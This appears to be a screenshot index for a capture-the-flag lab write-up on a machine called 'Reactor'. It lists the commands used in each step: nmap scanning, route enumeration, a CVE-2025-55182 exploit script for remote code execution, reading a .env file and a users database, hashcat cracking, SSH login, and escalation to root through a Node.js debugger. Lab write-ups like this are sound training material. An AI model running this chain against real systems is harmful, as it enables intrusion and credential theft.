# Reactor — Screenshot Index

| # | Filename | Command / Action Captured | README Section |
|---|----------|--------------------------|----------------|
| 01 | `reactor_01_ping.png` | `ping -c 1 10.129.3.134` | 1.1 Connectivity Test |
| 02 | `reactor_02_nmap_allports.png` | `nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.3.134 -oG allPorts` | 1.2 Port Scanning |
| 03 | `reactor_03_extractports.png` | `extractPorts allPorts` | 1.2 Port Scanning |
| 04 | `reactor_04_nmap_targeted_1.png` | `nmap -sCV -p22,3000 10.129.3.134 -oN targeted` (terminal output) | 1.3 Targeted Scan |
| 05 | `reactor_05_nmap_targeted_2.png` | `cat targeted` (file view) | 1.3 Targeted Scan |
| 06 | `reactor_06_webapp_dashboard.png` | Browser — ReactorWatch dashboard on `http://10.129.3.134:3000` | 2.1 Web Application Enumeration |
| 07 | `reactor_07_feroxbuster.png` | `feroxbuster -u http://10.129.3.134:3000 ...` | 2.2 Directory and Route Enumeration |
| 08 | `reactor_08_buildmanifest.png` | `curl ... _buildManifest.js` and `_ssgManifest.js` | 2.3 Next.js Build Manifest Analysis |
| 09 | `reactor_09_rce_id.png` | `python3 CVE-2025-55182.py -c "id" http://10.129.3.134:3000` | 3.1 CVE-2025-55182 RCE |
| 10 | `reactor_10_env_file.png` | `cat /opt/reactor-app/.env` (reverse shell) | 3.2 Credential Extraction |
| 11 | `reactor_11_sqlite_users.png` | `sqlite3 /opt/reactor-app/reactor.db "SELECT * FROM users;"` | 3.2 Credential Extraction |
| 12 | `reactor_12_hashcat.png` | `hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt` | 3.3 Cracking the Hash |
| 13 | `reactor_13_ssh_userflag.png` | `ssh engineer@10.129.3.134` + `cat user.txt` | 3.3 SSH Access + User Flag |
| 14 | `reactor_14_privesc_enum.png` | `ss -tlnp` + `ps aux \| grep node` (debugger on :9229) | 4.1 Node.js Inspector |
| 15 | `reactor_15_root_flag.png` | `node inspect 127.0.0.1:9229` + `process.binding` root.txt read | 4.2 Root Flag |
